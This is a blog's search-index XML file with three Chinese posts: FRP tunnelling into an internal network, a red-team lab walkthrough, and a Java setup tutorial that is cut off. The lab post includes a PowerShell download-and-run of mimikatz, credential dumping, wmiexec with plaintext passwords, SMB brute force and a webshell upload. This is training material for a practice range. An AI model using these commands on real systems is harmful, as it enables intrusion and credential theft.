<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2025/07/15/%E5%9F%BA%E4%BA%8EFRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%94%BB%E5%87%BB/"/>
      <url>/2025/07/15/%E5%9F%BA%E4%BA%8EFRP%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="基于FRP反向代理工具实现内网穿透攻击"><a href="#基于FRP反向代理工具实现内网穿透攻击" class="headerlink" title="基于FRP反向代理工具实现内网穿透攻击"></a>基于FRP反向代理工具实现内网穿透攻击</h1><h4 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h4><ul><li>前言</li><li>FRP反向代理</li><li><pre><code>* 内网环境搭建</code></pre><ul><li>服务端的配置</li><li>客户端的配置</li><li>FRP内网穿透</li><li>FRP进阶使用</li></ul></li><li>fscan内网神器</li><li>总结</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们拿下目标单位的一台外网服务器后，需要借助外网服务器作为跳板机去开展内网渗透，这个时候必不可少的就是在跳板机上设置代理。在前面的文章中，曾经在实际案例中介绍了两种代理方式：</p><ol><li>Webshell 管理工具——冰蝎直接设置 HTTP 隧道代理实现内网穿透：<a href="https://bwshen.blog.csdn.net/article/details/118066125">2021强网杯全国网络安全挑战赛Writeup</a>；</li><li>Cobaltstrike 建立 Socks4 代理实现内网穿透：<a href="https://bwshen.blog.csdn.net/article/details/118243520">Cobaltstrike内网渗透神器入门使用教程</a>。</li></ol><p>以上两种代理方式虽均能实现内网穿透的目的，但是代理质量相对来说并不稳定，难以满足内网渗透的需求。本文将介绍一个专注于内网穿透的高性能的反向代理应用——FRP，其支持 TCP、UDP、HTTP、HTTPS 等多种协议，可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><h2 id="FRP反向代理"><a href="#FRP反向代理" class="headerlink" title="FRP反向代理"></a>FRP反向代理</h2><p>FRP 的 <a href="https://gofrp.org/docs/overview/">中文官方文档</a> 可了解其作用和用法。</p><p>简而言之，FRP 通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括：</p><ol><li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li><li>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。</li><li>代理组间的负载均衡。</li><li>端口复用，多个服务通过同一个服务端端口暴露。</li><li>多个原生支持的客户端插件（静态文件查看，HTTP、SOCK5 代理等），便于独立使用 frp 客户端完成某些工作。</li><li>高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。</li><li>服务端和客户端 UI 页面。</li></ol><h3 id="内网环境搭建"><a href="#内网环境搭建" class="headerlink" title="内网环境搭建"></a>内网环境搭建</h3><p>本文将借助以下靶场环境进行 FRP 工具实现内网穿透的实验演示：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9a4bd526cb1d2bfbcb6d2952178322a2.png" alt="在这里插入图片描述"></p><p>1、由于虚拟机仅主机模式下默认是可与物理机连通的，故在 Win2008 域控主机上，防火墙新建了如下入站规则来拒绝 Win10 物理机的访问（禁止访问的 IP 为物理机的仅主机模式 VMnet1 网卡的网关 <code>192.168.52.1</code>）：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/108e4b3968ccd9f4e5c3341602e9c2f6.png" alt="在这里插入图片描述"></p><h3 id="服务端的配置"><a href="#服务端的配置" class="headerlink" title="服务端的配置"></a>服务端的配置</h3><p>FRP 代理工具可以直接在<a href="https://github.com/fatedier/frp"> Github下载 </a>：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0a64646e98d60bdacd260808cf43fe67.png" alt="在这里插入图片描述"></p><pre><code>├── frpc          #frp客户端执行程序├── frpc_full.ini ├── frpc.ini      #frp客户端配置文件├── frps          #frp服务端执行程序├── frps_full.ini├── frps.ini      #frp服务端配置文件└── LICENSE</code></pre><p>2、frp 服务默认不设置连接密码，frps.ini 文件默认只设置了端口：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/cbf0327849f062cc4ec5c1803173f476.png" alt="在这里插入图片描述"><br>我们可以修改服务端配置文件<code>frps.ini</code>来配置代理的连接密码，如下图所示：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1811b93055d5b99da0ff78fe5654d88e.png" alt="在这里插入图片描述"><br>3、执行命令<code>./frps -c ./frps.ini</code>开始运行 FRP 服务：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/39bf4901ba0ff38281a61f18949381f3.png" alt="在这里插入图片描述"></p><h3 id="客户端的配置"><a href="#客户端的配置" class="headerlink" title="客户端的配置"></a>客户端的配置</h3><p>1、将对应版本的 FRP 工具下载到 Win7 跳板机上并解压缩，客户端配置文件<code>frpc.ini</code>初识参数如下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9771e7a95e9e95c958d5a8eaf229f13d.png" alt="在这里插入图片描述">2、同样的修改 FRP 客户端配置文件<code>frpc.ini</code>来设置服务端的 IP 地址、端口、连接密码：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ba4e116213f86a3113388f820a312385.png" alt="在这里插入图片描述"><br>参数释义：</p><pre><code>[common]server_addr = 104.168.***.*** #VPS服务器的 IPserver_port = 7000            #VPS服务器上设置的 FRP 服务绑定端口token = ftp1234               #VPS服务端设置的 FRP 服务连接密码[socks5]      #这个是反向代理的名称，可以随意设置type = tcp    #socks5 是 TCP 协议的remote_port = 6666   #指定建立的反向代理的连接端口plugin = socks5      #指定建立 socks5 代理隧道use_encryption = trueuse_compression = true</code></pre><p>3、接下来执行命令<code>frpc.exe -c frpc.ini</code>启动客户端即可：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/30497386b8933be24a619d4f7ca82826.png" alt="在这里插入图片描述"></p><p>4、此时查看 VPS 服务器监听的 7000 端口已成功与客户端连接，同时开启了 6666 端口并建立了 socks5 代理通道：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/465520c0d001ea4644b1dd9b40c8ca8a.png" alt="在这里插入图片描述"></p><h3 id="FRP内网穿透"><a href="#FRP内网穿透" class="headerlink" title="FRP内网穿透"></a>FRP内网穿透</h3><p>配置完 FRP 服务端和客户端并建立起 socks5 隧道后，下面就来见证下利用该 FRP 代理隧道如何穿透内网！</p><p>1、在 Win10 物理机的谷歌浏览器设置如下代理：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f669a7c7f0035f0aec5fcf61ae03b6f.png" alt="在这里插入图片描述">2、然后让 Win10 的谷歌浏览器流量走 VPS 建立的 FRP socks5 代理，即可访问到内网域控主机的 Web 服务，成功实现内网穿透！<br><img src="https://i-blog.csdnimg.cn/blog_migrate/530c5d4d9840ade4186bc72c943dd4fc.png" alt="在这里插入图片描述">返回 VPS 也能查看到对应流量转发的信息：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e7ee7d37cc7e80b35f7bb90d2fc9680d.png" alt="在这里插入图片描述">3、以上除了在浏览器直接连接 frp 的 socks5 代理外，在实际渗透过程中为了结合 BurpSsuite 对内网 Web 系统进行抓包测试，还可以在浏览器连接 BurpSuite 代理，并在 BurpSuite 中设置流量走 frp 服务器的 socks5 代理即可，如下图所示：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fa0a75113a144913f377274036a04ee1.png" alt="在这里插入图片描述">4、此时谷歌浏览器挂着 BurpSuite 的代理便可以访问到内网的服务了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0e45187127dcdeb43cf942706d84cd18.png" alt="在这里插入图片描述">同时 BurpSuite 也能抓到内网服务的数据包了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f3282d8b34b5aee2dd0a0ee89013d804.png" alt="在这里插入图片描述">至此已成功借助 frp 搭建 socks5 代理隧道、实现内网穿透的目的！</p><h3 id="FRP进阶使用"><a href="#FRP进阶使用" class="headerlink" title="FRP进阶使用"></a>FRP进阶使用</h3><p>上文搭建的 socks5 隧道用于将公网主机（本文代指 Win10 物理机）访问内网服务器的请求流量直接通过访问 Win7 跳板机转发，从而实现内网穿透的目的。</p><p>FRP 反向代理还可以将内网主机的 22、3389 等端口转发到公网主机的指定端口，从而实现远程连接内网服务器的目的，如下图所示：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/041a2547b2ddebd2614cb5e599f4e9c9.png" alt="在这里插入图片描述"><br>相关用法请参见前文提及的 FRP 的 <a href="https://gofrp.org/docs/overview/">中文官方文档</a>，此处不再演示。</p><h2 id="fscan内网神器"><a href="#fscan内网神器" class="headerlink" title="fscan内网神器"></a>fscan内网神器</h2><p>此处搞点跟本文题目无关的题外知识hh，某次攻防演习看到同事使用了 fscan 扫描内网的服务，被秀了一把，不得不感叹真香！在此顺便借助该靶场环境记录下该工具的用法。</p><p>Fscan 工具的 <a href="https://github.com/shadow1ng/fscan">Github 项目地址</a>，有使用说明：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a3ce961db255a038caf8049078d51772.png" alt="在这里插入图片描述"></p><p>可直接下载：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9078f6f76634b0ac77d4f7fc727cb8ae.png" alt="在这里插入图片描述">简单用法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/16ad9970fe60214e14790281ab1a915a.png" alt="在这里插入图片描述">下面来体验下该工具，看看实际的使用效果！</p><p>1、拿到 Win7 跳板机的 Shell：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f8731aca9efed2bfe00313a67c540e89.png" alt="在这里插入图片描述">2、上传 fscan64.exe 文件到跳板机上：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0cfa920a183cd5b9422a7c98cfbc6bf6.png" alt="在这里插入图片描述">3、在 Cknife 中打开命令终端，执行命令<code>fscan64.exe -h 192.168.52.0/24 -o result.txt</code>，进行内网信息探测：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/58a14f0bc9f291faa23d89671a22fdea.png" alt="在这里插入图片描述"><br>4、下载并打开程序运行结果 result.txt，可以看到如下搜集到的全面的内网信息：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0c02a62e383da5dde9ea9120d822d00c.png" alt="在这里插入图片描述">附上所有结果：</p><pre><code>.168.52.138:445 open.168.52.143:139 open.168.52.138:88 open.168.52.141:7001 open.168.52.143:3306 open.168.52.141:445 open.168.52.143:445 open.168.52.141:139 open.168.52.138:139 open.168.52.143:135 open.168.52.141:135 open.168.52.141:21 open.168.52.143:80 open.168.52.138:80 open.168.52.141:8099 open.168.52.141:7002 open.168.52.138:135 open.168.52.141:8098 openNetInfo:[*]192.168.52.143   [-&gt;]stu1   [-&gt;]192.168.52.143   [-&gt;]169.254.129.186   [-&gt;]192.168.92.130NetInfo:[*]192.168.52.138   [-&gt;]owa   [-&gt;]192.168.52.138[*] 192.168.52.143       __MSBROWSE__\STU1              Windows 7 Professional 7601 Service Pack 1[+] 192.168.52.143MS17-010(Windows 7 Professional 7601 Service Pack 1)NetInfo:[*]192.168.52.141   [-&gt;]root-tvi862ubeh   [-&gt;]192.168.52.141[*] WebTitle:http://192.168.52.141:7002 code:200 len:2632   title:Sentinel Keys License Monitor[*] 192.168.52.141       GOD\SNTL_ROOT-TVI86   [+] 192.168.52.138MS17-010(Windows Server 2008 R2 Datacenter 7601 Service Pack 1)[*] 192.168.52.138 [+]DC GOD\OWA               Windows Server 2008 R2 Datacenter 7601 Service Pack 1[+] 192.168.52.141MS17-010(Windows Server 2003 3790)[*] WebTitle:http://192.168.52.138     code:200 len:4      title:IIS7[*] WebTitle:http://192.168.52.141:8099 code:403 len:1409   title:The page must be viewed over a secure channel[*] WebTitle:http://192.168.52.143     code:200 len:21     title:phpStudy 探针 2014[+] ftp://192.168.52.141:21:anonymous </code></pre><p>可以看到，扫描结果里包括了几大类信息：</p><ol><li>扫描的内网网段里存活的主机 IP 及其开放的端口；</li><li>扫描的内网网段里主机的名称、MS17-010 永恒之蓝等漏洞扫描结果（两台主机存在该漏洞）；</li><li>扫描的内网网段里主机开放的 Web 服务的标题、端口地址！</li></ol><p>此处验证下扫描到的几个内网 Web 服务是否真实存在：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1d056d1799e2ac707de176dde6d594c5.png" alt="在这里插入图片描述"><img src="https://i-blog.csdnimg.cn/blog_migrate/c6a82722f070421ef7cf29fbec87ec6b.png" alt="在这里插入图片描述"><img src="https://i-blog.csdnimg.cn/blog_migrate/cc85589a44b6d08a1f04529ae8bcfc59.png" alt="在这里插入图片描述">看到这，你应该明白 fscan 这款内网神器有多香了吧！收集到如此多的内网资产信息，接下来的内网横向渗透就更加简便清晰了！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文学习、总结了内网穿透神器 FRP 反向代理工具的使用方法，同时介绍了 fscan 内网资产情况扫描神器的使用。在实际的攻防演习、内网渗透中，拿到外网跳板机的 Shell 权限后，我们可以使用 fscan 在跳板机上扫描内网进行资产搜集，然后使用 FRP 进行内网穿透后对收集到的内网资产进行横向渗透攻击！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA_%E4%B8%89_%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2025/07/15/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA_%E4%B8%89_%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="红日安全红队靶场（三）一次简单的内网渗透"><a href="#红日安全红队靶场（三）一次简单的内网渗透" class="headerlink" title="红日安全红队靶场（三）一次简单的内网渗透"></a>红日安全红队靶场（三）一次简单的内网渗透</h1><pre><code>个人公众号：白帽技术与网络安全</code></pre><p><strong>1、靶场介绍及设置</strong></p><p>这是红日团队的第三套靶场（靶场下载地址见文末），本次靶场渗透涉及 <strong>敏感信息泄露</strong> 、 <strong>暴力破解</strong> 、 <strong>脏牛提权</strong> 、 <strong>内网穿透</strong> 、 <strong>端口转发</strong> 、以及 <strong>域渗透</strong> 等多种知识点。该靶场环境由5台机器组成，其中包括3台Windows机器和2台Linux机器。</p><p>靶场拓扑如下：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/972187770938ab7abec30e6a438b5c25.jpeg"></p><p><strong>网卡配置</strong></p><p>在虚拟机的网络编辑器中添加两个host only网卡，ip段分别为192.168.1.0&#x2F;24和192.168.93.0&#x2F;24</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/91ca9ddc8c5fef3950f8fe3fd52b0851.png"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="2、服务器渗透"><a href="#2、服务器渗透" class="headerlink" title="2、服务器渗透"></a><strong>2、服务器渗透</strong></h3><h4 id="2-1、信息收集"><a href="#2-1、信息收集" class="headerlink" title="2.1、信息收集"></a><strong>2.1、信息收集</strong></h4><p><strong>2.1.1、端口扫描</strong></p><p>使用nmap进行端口扫描</p><pre><code>Nmap -T4 -sC -sV 192.168.1.110</code></pre><p>端口扫描发现外网服务器开启了22、80、3306端口,初步判断开启了SSH、HTTP和MySQL的数据库服务。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/769500d711359bcbf61a130b02e6d579.png"></p><p>这里首先访问一下80端口，发现使用的是joomla CMS。（推荐一个谷歌插件：Wappalyzer）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a863681435ad32b9dfbe2306010d9dc9.png"></p><p>知道是joomla了，那就使用msf的auxiliary&#x2F;scanner&#x2F;http&#x2F;joomla_version模块扫一下看看版本。Joomla版本探测显示版本为3.9.12。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5235d8f680250e3a28fd963ba53b1b44.png"></p><p>知道版本号之后就可以在网上的各大漏洞库（文末有常用的漏洞库链接）中搜索一下，是否存在可以利用的漏洞。由于唯一可用的rce需要管理员的账户和密码遂继续搜集信息。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/98bf6df13f4f7c3d53ab193d76df3521.png"></p><p><strong>2.1.2、目录扫描</strong></p><p>接下来使用dirsearch进行目录扫描，发现了robots.txt、网站的后台&#x2F;administrator&#x2F;和一个configuration.php~文件</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6a6fa5b8dcc66f3fbf5f78a37effcb93.png"></p><p>访问网站的后台发现一个登录框，使用burp suite抓包简单跑了一下，没跑出来。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/500137450c3ae90ffe4f3ab92bfafaec.png"></p><p>接下来继续看一下配置文件都有什么</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/df06c2ccb2fc772123919a5ce546a7f6.png"></p><p>在配置文件中发现了数据库的账号和密码testuser&#x2F;cvcvgjASD!@,于是使用工具连接数据库，成功！</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/00faa8541a165fc0a7856d1f9ae3a402.png"></p><p>拿到了数据库下一步就是要想办法添加一个账户，查看数据库后发现密码是加密存储的。由于加密算法未知，于是还得求助于搜索引擎。不得不说，Google yyds! 根据joomla的官方文档成功的添加一个用户admin2&#x2F;serect。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/3bdd8974d7790d329640855d7921770a.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a19e56ce3dc1c50a766442f8bba254f0.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/f97b97d23faec491a1ce8652b6f93b76.png"></p><p>使用刚刚添加的用户成功登录到了后台</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d4d249feaac8df9c745046da12253bf6.png"></p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="2-2、Getshell"><a href="#2-2、Getshell" class="headerlink" title="2.2、Getshell"></a><strong>2.2、Getshell</strong></h4><p>在后台寻找到一处可以上传php的地方，直接上传我祖传的冰蝎马~</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8496b73cc735473df80be72d60999c76.png"></p><p>连接成功</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6b49627dacbafa0713f221d7f6521645.png"></p><p>试了一下无法执行命令，发现disable_functions禁用了一些可以执行命令或代码的函数。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/57ba95fbda7a8d2dc63bcfdfaa708310.png"></p><p>Disable_functions</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/632092e1d9b9817810c75a9ff8ce2537.png"></p><p>虽然无法执行命令但是可以浏览文件，那就先翻一翻文件。最后在&#x2F;tmp&#x2F;mysql&#x2F;下发现一个test.txt文件，并在其中发现了账号密码。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/78a50b6f02ca8fdece404bd36b08e9be.png"></p><p>由于服务器开启了SSH服务于是尝试登录一下，成功！经过简单信息搜集发现这是一台双网卡机器，并且内核较老，可以使用脏牛漏洞提权。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/eab74f68299140a562aadafe1fd9b275.png"></p><h4 id="-2"><a href="#-2" class="headerlink" title=""></a></h4><h4 id="2-3、权限提升"><a href="#2-3、权限提升" class="headerlink" title="2.3、权限提升"></a><strong>2.3、权限提升</strong></h4><p>使用ftp上传提权脚本</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7a3faac69e05286dd4806feee152b826.png"></p><p>执行提权脚本</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ca347d019e578216c8abf34cc4663e5c.png"></p><p>提权成功。常用的脏牛提权脚本是生成firefart用户，我这里用的脚本直接覆盖了root用户的密码，将root用户的密码修改成了自己设定的123456。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fca6181001ebb11b7d21ec58e531cf28.png"></p><h4 id="-3"><a href="#-3" class="headerlink" title=""></a></h4><h4 id="2-4、代理搭建"><a href="#2-4、代理搭建" class="headerlink" title="2.4、代理搭建"></a><strong>2.4、代理搭建</strong></h4><p>为了方便内网渗透在这里搭建一个frp代理</p><p>frpc.ini配置如下</p><pre><code>[common]server_addr = 192.168.1.128　　＃kali的IP地址server_port = 17000token = 1q2w3e pool_count = 5        protocol = tcp                #协议类型health_check_type = tcphealth_check_interval_s = 100[test] remote_port = 10000           #代理的端口plugin = socks5               #使用的协议use_encryption = true         #是否加密use_compression = true</code></pre><p>frps.ini配置如下</p><pre><code>[common]bind_addr = 0.0.0.0        #绑定的ip，为本机bind_port = 17000          #绑定的端口dashboard_addr = 0.0.0.0   #管理地址dashboard_port = 27500     #管理端口dashboard_user = root      #管理的用户名dashboard_pwd  = toor    #管理用户的密码token = 1q2w3e             #客户端服务端连接的密码heartbeat_timeout = 90     #心跳超时时间max_pool_count = 5         #最大同时连接数</code></pre><p>在kali上启动frp server</p><pre><code>./frps -c frps.ini</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6f23854f19915b828c78f9d99c0dcc2f.png"></p><p>在linux上启动frp client</p><pre><code>./frpc -c frpc.ini</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c9683fecc4e4fb396cd8d76bf847b374.png"></p><p>在本机上配置proxifier</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c475c41169e87ca5b023e2bd9afd81f9.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b636e7f6198d8eb7707ed10e9e0ae0ac.png"></p><p>测试代理</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/0a0abf5d47c8c9fcb1a43ce05a289f0a.png"></p><h4 id="-4"><a href="#-4" class="headerlink" title=""></a></h4><h3 id="3、内网渗透"><a href="#3、内网渗透" class="headerlink" title="3、内网渗透"></a><strong>3、内网渗透</strong></h3><p><strong>3.1、主机探测</strong></p><p>使用MSF的auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version模块扫内网的存活主机，发现内网存在域名为TEST的三台域内主机，分别是</p><pre><code>win7 192.168.93.30/24不知名机器 192.168.93.20/24Windows server 2012 R2 192.168.93.10/24（那台不知名机器其他大佬测的时候都是正常的server 2008）</code></pre><p><strong>3.2、口令爆破</strong></p><p>接下来使用smb_login模块爆破smb服务。在这一步，网上好多大佬都说使用了自己top10000的字典跑出了密码。非常巧，在我的top10000字典中恰好没有这个密码（所以为了伪装成一个大佬我就手动把密码加了进去~）</p><p>跑出了两台机器192.168.93.30&#x2F;192.168.93.20的密码都是123qwe!ASD</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1e06639e0a1cfcb8202365e24127cb46.png"></p><p>既然拿到了密码，接下来就可以使用wmiexec获取一个shell。</p><pre><code>.\wmiexec_windows.exe administrator:123qwe!ASD@192.168.93.20＃　WMI的全名为“Windows Management Instrumentation”。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。从Windows 98开始，Windows操作系统都支持WMI。利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。</code></pre><p>执行ipconfig &#x2F;all发现dns服务器为192.168.93.10，初步判断域控就是这台Windows 2012</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a5c76cbbe47469f4d0899eb4bf89bad3.png"></p><p>看了一下进程列表没有发现杀软进程</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4645d45c36a728df00dc255bc595b580.png"></p><p><strong>3.3、mimikatz抓密码</strong></p><p>因为内网主机不出网所以将mimikatz上传到Linux机器上，在Linux上使用python启动一个http服务。</p><pre><code>python -m SimpleHTTPServer 8080</code></pre><p>在Windows server2008上使用powershell下载到本地并执行，这里有一个问题就是使用wmiexec获取到的只是一个半交互的shell，所以mimikatz执行的结果需要保存在日志中方便读取。</p><pre><code>powershell (new-object Net.WebClient).DownloadFile(&#39;http://192.168.93.100:8888/kiwikatz.exe&#39;,&#39;C:\mimikatz.exe&#39;)</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ab60e0377fa25ce27cacd1ce93c498ff.png"></p><p>执行后查看日志发现抓到了域控的明文口令</p><pre><code>mimikatz.exe log privilege::debug sekurlsa::logonpasswords</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d559013b02eee0615139fcc8889a8182.png"></p><p>使用wmiexec连接域控</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ca0b2a9a8cc2f29ef0e841928094bb47.png"></p><p>最终在C:\Users\Adminisreator\Documents\目录下找到flag.txt</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/0641c341d8db644ed94e29e2d763109f.png"></p><p>Capture the flag! 收工！</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/61408e40406ed395ec84fca9a77cd062.png"></p><h3 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a><strong>4、总结</strong></h3><p>总的来说这个靶场环境的渗透并不算难，但是在第一次做的时候依旧花费了一天的时间。在这之后又按照网上各位大佬渗透思路做了几次，每一次都会有一些新的收获。</p><h3 id="5、相关链接"><a href="#5、相关链接" class="headerlink" title="5、相关链接"></a><strong>5、相关链接</strong></h3><p>靶场地址</p><pre><code>http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</code></pre><p>漏洞库</p><pre><code>https://www.exploit-db.comhttps://www.pwnwiki.org/http://wiki.peiqi.tech/https://github.com/EdgeSecurityTeam/Vulnerability</code></pre><p>浏览器插件</p><pre><code>https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?utm_source=chrome-ntp-icon</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F_%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%AF%A6%E8%A7%A3_%E5%85%A8%E7%BD%91%E6%9C%80%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B_/"/>
      <url>/2025/07/15/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F_%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%AF%A6%E8%A7%A3_%E5%85%A8%E7%BD%91%E6%9C%80%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B_/</url>
      
        <content type="html"><![CDATA[<h1 id="java环境变量-的配置与详解（全网最详细教程）"><a href="#java环境变量-的配置与详解（全网最详细教程）" class="headerlink" title="java环境变量 的配置与详解（全网最详细教程）"></a>java环境变量 的配置与详解（全网最详细教程）</h1><p>笔者这学期开始学习java课程，学习java开发首先需要配置java运行环境变量。虽然上课老师也讲了如何配置java环境变量，可是笔者的同学还是有好多都不会配置，所以笔者最近配置了特别多次java环境变量。如下笔者详细解释从JDK安装到环境变量的装配。</p><hr><p><strong>目录</strong></p><p>JDK的下载与安装</p><p>配置java环境变量</p><p>JAVA_HOME变量</p><p>Path变量</p><p>ClassPath变量</p><p>classpath变量配置的解释</p><p>java运行环境的验证</p><hr><hr><ul><li><h2 id="JDK的下载与安装"><a href="#JDK的下载与安装" class="headerlink" title="JDK的下载与安装"></a><strong>JDK的下载与安装</strong></h2></li></ul><p>首先，百度直接搜索JDK，然后打开Oracle的jdk下载网页。（如果你比较懒 ，下方为链接）</p><p><a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p><p>接下来别忘记选择接受协议，然后打开系统设置面板检查所用电脑的系统位数。（64位 or 32位）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/51fce46dcad3e729d960fb6c92e2bcc0.png"></p><p>如果为32位选择绿色剪头，如果为64位选择红色箭头。（如果是苹果电脑，请自行选择Mac选项）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d01fbbb730c1db553eedb92850b6c98e.png"></p><p>下载完成后打开安装包，点击下一步直到下图步骤。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b43d7c32c5c9e890de6223b435b51a8f.png"></p><p>笔者推荐类似这种 语言的运行环境 装在C盘，如果C盘空间不足，或者比较介意请点击更改，选择你想要的路径（建议放在一个新建的空文件夹中）</p><p>（此处为盗图，因为笔者的电脑都已经装了两套环境了，所以没有再次安装）</p><p><strong>注意：这个路径要记住，后面步骤要用到。</strong></p><p>然后继续点击下一步，直到下图步骤。（盗图）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/34d58717adbd10c24fcb815e4768e7e7.png"></p><p>这里，如果上一步更改路径了，选择更改（注意：要和上一个保存在同一目录下）如果上一步没有更改，点击下一步。</p><p>可能这里有人问，刚才不是选择过安装路径了吗？现在怎么又要选择？</p><p>这里解释一下，可能细心的朋友已经发现了刚才选择路径时，默认路径是：C:\Porgram File\Java\jdk1.8.0_181</p><p>这里的默认路径是：C:\Porgram 